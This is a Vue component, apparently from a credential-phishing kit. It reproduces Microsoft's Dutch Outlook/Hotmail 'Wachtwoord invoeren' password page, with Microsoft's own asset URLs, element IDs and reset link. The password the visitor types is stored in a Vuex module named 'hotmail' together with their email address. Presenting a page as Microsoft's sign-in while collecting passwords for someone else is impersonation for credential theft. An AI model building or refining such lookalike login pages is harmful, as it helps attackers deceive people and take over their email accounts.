<template>
  <div role="main">
    <div class="">
      <div class="animate slide-in-next">
        <div>
          <div class="identityBanner">
            <button
              type="button"
              class="backButton"
              id="idBtn_Back"
              aria-label="Terug"
              @click="clickBack"
            >
              <img
                role="presentation"
                src="https://logincdn.msauth.net/16.000.28253.1/images/arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410"
              />
            </button>
            <div
              id="displayName"
              class="identity"
              :title="emailAddress.toLowerCase()"
            >
              {{ emailAddress.toLowerCase() }}
            </div>
          </div>
        </div>
      </div>
      <div class="pagination-view animate has-identity-banner slide-in-next">
        <div>
          <div
            id="loginHeader"
            class="row text-title"
            role="heading"
            aria-level="1"
          >
            Wachtwoord invoeren
          </div>
          <div class="row">
            <div class="form-group col-md-24">
              <div role="alert" aria-live="assertive">
                <div
                  id="passwordError"
                  class="alert alert-error"
                  v-if="passwordError"
                >
                  Voer het wachtwoord voor je Microsoft-account in.
                </div>
              </div>
              <div class="placeholderContainer">
                <input
                  name="passwd"
                  type="password"
                  id="i0118"
                  autocomplete="off"
                  class="form-control"
                  aria-required="true"
                  aria-describedby="loginHeader passwordDesc"
                  placeholder="Wachtwoord"
                  :aria-label="
                    `Voer het wachtwoord voor ${emailAddress.toLowerCase()} in`
                  "
                  tabindex="0"
                  v-model="password"
                />
              </div>
            </div>
          </div>
          <div class="position-buttons">
            <div>
              <div
                id="idTd_PWD_KMSI_Cb"
                class="form-group checkbox text-block-body no-margin-top"
              >
                <label id="idLbl_PWD_KMSI_Cb">
                  <input
                    name="KMSI"
                    id="idChkBx_PWD_KMSI0Pwd"
                    type="checkbox"
                    aria-label="Aangemeld blijven"
                  />
                  <span>Aangemeld blijven</span>
                </label>
              </div>
              <!-- /ko -->
              <div class="row">
                <div class="col-md-24">
                  <div class="text-13 action-links">
                    <div class="form-group">
                      <a
                        id="idA_PWD_ForgotPassword"
                        role="link"
                        href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3flc%3d1043%26mkt%3dNL-NL%26wa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1563540631%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253dae37e84f-2c95-3176-1b02-4d5f8b1dd2ad%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26uaid%3d8254b89138354810a9daa3fa058647f9%26contextid%3d49F9648E59E6A96F%26bk%3d1563553691&amp;id=292841&amp;uiflavor=web&amp;cobrandid=90015&amp;uaid=8254b89138354810a9daa3fa058647f9&amp;mkt=NL-NL&amp;lc=1043&amp;bk=1563553691"
                        >Ik ben mijn wachtwoord vergeten</a
                      >
                    </div>
                    <div class="form-group"></div>
                  </div>
                </div>
              </div>
            </div>
            <div class="row">
              <div>
                <div class="col-xs-24 no-padding-left-right button-container">
                  <div class="inline-block">
                    <input
                      type="submit"
                      id="idSIButton9"
                      class="btn btn-block btn-primary"
                      value="Aanmelden"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import { mapGetters, mapActions } from "vuex";
export default {
  name: "PasswordView",
  props: ["passwordError"],
  computed: {
    emailAddress: {
      get() {
        return this.$store.state.hotmail.emailAddress;
      },
      set(value) {
        this.$store.commit("setEmailAddress", value);
      }
    },
    password: {
      get() {
        return this.$store.state.hotmail.password;
      },
      set(value) {
        this.$store.commit("setPassword", value);
      }
    }
  },
  methods: {
    clickBack() {
      this.password = "";
      this.$emit("back");
    }
  }
};
</script>
